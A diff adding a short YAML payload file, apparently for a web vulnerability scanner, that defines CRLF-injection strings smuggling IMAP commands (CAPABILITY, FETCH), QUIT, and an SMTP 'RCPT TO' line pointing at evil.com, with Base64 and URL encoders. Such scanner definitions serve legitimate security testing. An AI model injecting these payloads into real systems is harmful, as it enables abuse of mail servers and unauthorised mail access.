@@ -1,0 +1,10 @@
+payload:
+  - "\r\nV100 CAPABILITY\r\nV101 FETCH 4791"
+  - "\r\nQUIT\r\n"
+  - "\nRCPT TO: test@evil.com\n"
+encoder:
+  - Base64Flat
+  - Url
+placeholder:
+  - UrlPath
+  - UrlParam
